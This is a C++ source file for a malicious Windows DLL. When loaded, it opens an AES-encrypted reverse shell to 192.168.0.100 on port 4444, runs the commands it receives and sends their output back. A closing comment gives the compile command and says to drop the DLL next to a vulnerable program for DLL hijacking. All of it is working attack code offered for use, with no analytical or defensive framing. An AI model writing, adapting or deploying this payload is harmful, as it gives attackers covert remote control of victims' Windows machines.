// dll_payload.cpp
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <bcrypt.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

#define AES_KEY_SIZE 16
#define AES_BLOCK_SIZE 16

static const BYTE AES_KEY[AES_KEY_SIZE] = {
    0x42, 0x37, 0x91, 0xAF, 0xD3, 0x99, 0x58, 0x1C,
    0x70, 0xAA, 0xE2, 0x4B, 0xC9, 0x31, 0xDD, 0x60
};

static const BYTE AES_IV[AES_BLOCK_SIZE] = {
    0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,
    0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00
};

static int recv_decrypt(SOCKET s, BYTE* out, DWORD out_len) {
    BYTE buf[512];
    int rcv_len = recv(s, reinterpret_cast<char*>(buf), sizeof(buf), 0);
    if (rcv_len <= 0) return -1;

    BCRYPT_ALG_HANDLE algo;
    BCRYPT_KEY_HANDLE key;
    BCryptOpenAlgorithmProvider(&algo, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(algo, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(algo, &key, NULL, 0, (PUCHAR)AES_KEY, AES_KEY_SIZE, 0);

    ULONG out_actual;
    BCryptDecrypt(key, buf, rcv_len, NULL, (PUCHAR)AES_IV, AES_BLOCK_SIZE, out, out_len, &out_actual, 0);

    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(algo, 0);

    return out_actual;
}

static int encrypt_send(SOCKET s, BYTE* in, DWORD in_len) {
    BYTE buf[512];

    BCRYPT_ALG_HANDLE algo;
    BCRYPT_KEY_HANDLE key;
    BCryptOpenAlgorithmProvider(&algo, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(algo, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(algo, &key, NULL, 0, (PUCHAR)AES_KEY, AES_KEY_SIZE, 0);

    ULONG out_len;
    BCryptEncrypt(key, in, in_len, NULL, (PUCHAR)AES_IV, AES_BLOCK_SIZE, buf, sizeof(buf), &out_len, 0);

    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(algo, 0);

    return send(s, reinterpret_cast<char*>(buf), out_len, 0);
}

static void InteractiveShell(SOCKET s) {
    char cmd_buf[256], output[1024];

    while (true) {
        ZeroMemory(cmd_buf, sizeof(cmd_buf));
        if (recv_decrypt(s, (BYTE*)cmd_buf, sizeof(cmd_buf)) <= 0)
            break;

        FILE* pipe = _popen(cmd_buf, "r");
        if (!pipe) break;

        while (fgets(output, sizeof(output), pipe)) {
            encrypt_send(s, (BYTE*)output, (DWORD)strlen(output));
        }

        _pclose(pipe);
        encrypt_send(s, (BYTE*)"\n<EOF>\n", 7);
    }
}

static BOOL CreateEncryptedReverseShell(const char* ip, unsigned short port) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa)) return FALSE;

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;

    sockaddr_in srv{};
    srv.sin_family = AF_INET;
    srv.sin_port = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);

    if (connect(s, (sockaddr*)&srv, sizeof(srv)) == SOCKET_ERROR)
        return FALSE;

    InteractiveShell(s);
    closesocket(s);
    WSACleanup();
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        CreateEncryptedReverseShell("192.168.0.100", 4444);
    }
    return TRUE;
}


/*
┌─ Compilation ───────────────────────────────────────────────┐
│                                                                                                      

x86_64-w64-mingw32-g++ -shared -o dll_payload.dll dll_payload.cpp -lws2_32

│ place dll_payload.dll next to legit vulnerable EXE        . │
└─────────────────────────────────────────────────────────────┘

*/